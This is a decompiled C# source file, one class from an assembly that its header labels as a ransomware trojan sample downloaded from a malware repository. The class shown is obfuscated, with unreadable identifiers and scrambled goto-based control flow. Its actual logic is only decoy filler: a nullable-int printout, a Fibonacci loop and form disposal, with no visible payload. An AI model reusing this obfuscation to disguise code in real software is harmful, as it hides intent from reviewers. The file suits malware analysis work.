// Decompiled with JetBrains decompiler
// Type: .
// Assembly: tr, Version=89.0.0.7817, Culture=neutral, PublicKeyToken=null
// MVID: C7A59EE7-1CAF-434C-9666-6BB9356A3307
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b2ceb635dd73ee127a1c58cbf61dac4bd7c74ac58cd1468b5296b74acfbb7862.exe

using \u0002;
using Jaqqcoxlswhfwmhltmuzfs;
using System;
using System.ComponentModel;
using System.Threading;
using System.Windows.Forms;

namespace \u0004
{
  internal class \u0004 : Form
  {
    private IContainer \u0001 = (IContainer) null;
    internal ListView \u0001;

    public \u0004() => \u0004.\u0001(this);

    internal void \u0001(object _param1, EventArgs _param2)
    {
      int? nullable;
      if (true)
        nullable = new int?(12);
      else
        goto label_11;
label_2:
      int num1 = 0;
      goto label_13;
label_11:
      Thread.Sleep(1000);
      if (true)
        ++num1;
      else
        goto label_15;
label_13:
      int num2;
      for (int index = num1 < 20 ? 1 : 0; index != 0; index = num2)
      {
        int valueOrDefault;
        int num3;
        if (nullable.HasValue)
        {
          valueOrDefault = nullable.GetValueOrDefault();
          num2 = 1;
          if (num2 == 0)
            continue;
          num3 = num2;
        }
        else
          num3 = 0;
        if (num3 != 0)
        {
          if (true)
          {
            Console.WriteLine(string.Format("The nullable int 'maybe' has the value {0}", (object) valueOrDefault));
            goto label_11;
          }
          else
            goto label_20;
        }
        else
        {
          Console.WriteLine("The nullable int 'maybe' doesn't hold a value");
          goto label_11;
        }
      }
label_15:
      do
      {
        ClassLibrary classLibrary = new ClassLibrary();
        Console.Write("Enter a positive integer:");
        classLibrary.Data();
      }
      while (false);
      Decimal num4;
      if (true)
      {
        Decimal num5 = 10M;
        Decimal num6;
        num4 = num6 = 1M;
        while (num4 <= num5)
        {
          Decimal num7 = num4;
          num4 = num6 + num4;
          num6 = num7;
        }
      }
      else
        goto label_2;
label_20:
      Console.WriteLine("The Fibonacci number following this is {0}", (object) num4);
    }

    internal void \u0002(object _param1, EventArgs _param2)
    {
    }

    void Form.\u0001(bool _param1)
    {
      int num;
      if (!_param1)
      {
        num = 0;
        goto label_7;
      }
label_6:
      num = this.\u0001 != null ? 1 : 0;
label_7:
      if (num != 0)
      {
        if (false)
          goto label_6;
      }
      else
        goto label_5;
label_3:
      if (true)
        this.\u0001.Dispose();
label_4:
      if (false)
        goto label_3;
label_5:
      if (true)
      {
        // ISSUE: explicit non-virtual call
        __nonvirtual (((Form) this).Dispose(_param1));
      }
      else
        goto label_4;
    }
  }
}
